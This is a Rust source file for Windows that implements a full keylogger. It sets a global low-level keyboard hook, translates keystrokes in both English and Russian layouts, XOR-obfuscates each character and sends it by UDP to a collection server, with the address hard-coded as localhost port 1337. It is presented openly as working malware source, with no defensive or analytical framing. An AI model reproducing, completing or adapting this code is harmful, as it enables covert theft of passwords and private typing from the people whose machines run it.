use lazy_static::lazy_static;
use std::{
    collections::HashMap,
    net::UdpSocket,
    ptr,
};
use windows::Win32::{
    Foundation::*, 
    UI::Input::KeyboardAndMouse::*, 
    UI::WindowsAndMessaging::*,
};

lazy_static! {
    static ref TRANSLATE_TABLE: HashMap<u32, KeyVal> =  HashMap::from([
        (0xC0,KeyVal::from("`","~","ё","Ё")),
        (0x31,KeyVal::from("1","!","1","!")),
        (0x32,KeyVal::from("2","@","2","\"")),
        (0x33,KeyVal::from("3","#","3","№")),
        (0x34,KeyVal::from("4","$","4",";")),
        (0x35,KeyVal::from("5","%","5","")),
        (0x36,KeyVal::from("6","^","6",":")),
        (0x37,KeyVal::from("7","&","7","?")),
        (0x38,KeyVal::from("8","*","8","*")),
        (0x39,KeyVal::from("9","(","9","(")),
        (0x30,KeyVal::from("0",")","0",")")),
        (0xBD,KeyVal::from("-","_","-","_")),
        (0xBB,KeyVal::from("=","+","=","+")),
        (0x51,KeyVal::from("q","Q","й","Й")),
        (0x57,KeyVal::from("w","W","ц","Ц")),
        (0x45,KeyVal::from("e","E","у","У")),
        (0x52,KeyVal::from("r","R","к","К")),
        (0x54,KeyVal::from("t","T","е","Е")),
        (0x59,KeyVal::from("y","Y","н","Н")),
        (0x55,KeyVal::from("u","U","г","Г")),
        (0x49,KeyVal::from("i","I","ш","Ш")),
        (0x4F,KeyVal::from("o","O","щ","Щ")),
        (0x50,KeyVal::from("p","P","з","З")),
        (0xDB,KeyVal::from("[","{","х","Х")),
        (0xDD,KeyVal::from("]","}","ъ","Ъ")),
        (0x41,KeyVal::from("a","A","ф","Ф")),
        (0x53, KeyVal::from("s","S","ы","Ы")),
        (0x44,KeyVal::from("d","D","в","В")),
        (0x46,KeyVal::from("f","F","а","А")),
        (0x47,KeyVal::from("g","G","п","П")),
        (0x48,KeyVal::from("h","H","р","Р")),
        (0x4A,KeyVal::from("j","J","о","О")),
        (0x4B,KeyVal::from("k","K","л","Л")),
        (0x4C,KeyVal::from("l","L","д","Д")),
        (0xBA,KeyVal::from(";",":","ж","Ж")),
        (0xDE,KeyVal::from("'","\"","э","Э")),
        (0xDC,KeyVal::from("\\","|","\\","/")),
        (0x5A,KeyVal::from("z","Z","я","Я")),
        (0x58,KeyVal::from("x","X","ч","Ч")),
        (0x43,KeyVal::from("c","C","с","С")),
        (0x56,KeyVal::from("v","V","м","М")),
        (0x42,KeyVal::from("b","B","и","И")),
        (0x4E,KeyVal::from("n","N","т","Т")),
        (0x4D,KeyVal::from("m","M","ь","Ь")),
        (0xBC,KeyVal::from(",","<","б","Б")),
        (0xBE,KeyVal::from(".",">","ю","Ю")),
        (0xBF,KeyVal::from("/","?",".",",")),

        (0x08, KeyVal::from_spec("[backspace]")),
        (0x09, KeyVal::from_spec("[tab]")),
        (0x11, KeyVal::from_spec("[ctrl]")),
        (0xA2, KeyVal::from_spec("[lctrl]")),
        (0xA3, KeyVal::from_spec("[rctrl]")),
        (0x12, KeyVal::from_spec("[alt]")),
        (0xA4, KeyVal::from_spec("[lalt]")),
        (0xA5, KeyVal::from_spec("[ralt]")),
        (0x14, KeyVal::from_spec("[caps lock]")),
        (0x5b, KeyVal::from_spec("[WIN]")),
        (0x0D, KeyVal::from_spec("[enter]")),
        (0x20, KeyVal::from_spec(" ")),
    ]);
}


fn is_special_key(key: &u32) -> bool {
    matches!(key, 0x08 | 0x09 | 0x11 | 0xA2 | 0xA3 | 
                  0x12 | 0xA4 | 0xA5 | 0x14 | 0x5b | 0x0D)
}

struct KeyVal {
    eng_char: &'static str,
    eng_shift_char: &'static str,
    rus_char: &'static str,
    rus_shift_char: &'static str,
    special_char: &'static str,
}

impl KeyVal {
    fn get_key_value(&self, index: usize) -> &str {
        match index {
            0 => self.eng_char,
            1 => self.eng_shift_char,
            2 => self.rus_char,
            3 => self.rus_shift_char,
            _ => self.special_char,
        }
    }
    
    const fn from_spec(spec_char: &'static str) -> KeyVal {
        KeyVal {
            eng_char: "",
            eng_shift_char: "",
            rus_char: "",
            rus_shift_char:"",
            special_char: spec_char,
        }
    }

    const fn from (eng_char: &'static str, eng_shift_char: &'static str, rus_char: &'static str, rus_shift_char: &'static str) -> KeyVal {
        KeyVal {
            eng_char, 
            eng_shift_char,
            rus_char, 
            rus_shift_char,
            special_char: "",
        }
    }
}


fn crypt_message(data: String) -> Vec::<u8> {
    let xor = |a: u8, b: u8| -> u8 { (a & !b) | (!a & b) };
    let key = 0x30;
    let mut message: Vec<u8> = data.bytes().map(|symb|xor(symb, key)).collect();
    message.push(key);
    message
}

fn send_to_server(data: Vec::<u8>) {
    
    let socket = UdpSocket::bind("127.0.0.1:13337").expect("");
    socket.connect("127.0.0.1:1337").expect("");
    socket.send(&data).expect("Couldn't send message");
}

unsafe fn handle_hook(key: u32) {
    let keyboard_layout = {
        let foreground = GetForegroundWindow();
        let thread_id = GetWindowThreadProcessId(foreground, None);
        GetKeyboardLayout(thread_id)
    };

    let shift_pressed = (GetKeyState(0x10) & 0x1000) != 0 ||    //Shift pressed
                                (GetKeyState(0xA1) & 0x1000) != 0 ||  //RShift pressed
                                (GetKeyState(0xA0) & 0x1000) != 0;    //LShift pressed

    let lowercase = {
        let xor = |a: bool, b: bool| -> bool { (a && !b) || (!a && b) };
        let caps_pressed = (GetKeyState(0x14) & 0x0001) != 0;

        !xor(caps_pressed, shift_pressed)
    };

    let mut index = 0;
    if is_special_key(&key) {
        index = 4;
    } else {
        let mask = 0x0FFFF;
        let layout = mask & keyboard_layout.0;
        let russian_layout = 0x419;
        
        if russian_layout == layout {
            index += 2;
        }

        if shift_pressed {
            index += 1;
        }
    }

    if let Some(val) = TRANSLATE_TABLE.get(&key) {
        let mut key_value = val.get_key_value(index).to_string();
        
		if lowercase {
            key_value = key_value.to_lowercase();
        }

        let message = crypt_message(key_value);
        send_to_server(message);
    }
    
}

unsafe extern "system" fn hook_callback(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    let event = w_param.0 as u32;
    if event == WM_KEYDOWN {
        //To convert to a KBDLLHOOKSTRUCT structure you can use std::mem::transmute
        //let info: *mut KBDLLHOOKSTRUCT = mem::transmute(l_param);
        //But for some reason the code doesn’t work in the release version, so I took the address and simply dereferenced it
        let hook_struct_addr = l_param.0 as *const u8;
        let key_code = *hook_struct_addr as u32;
        handle_hook(key_code);
    }

    CallNextHookEx(None, code, w_param, l_param)
}

fn main() {
    unsafe {
        match SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), HINSTANCE(0), 0) {
            Ok(hook_id) => {
                while GetMessageW(ptr::null_mut(), HWND(0), 0, 0).as_bool() {}
                let _ = UnhookWindowsHookEx(hook_id);
            }
            Err(e) => eprintln!("Can't set hook!\n{e}"),
        }
    }
}
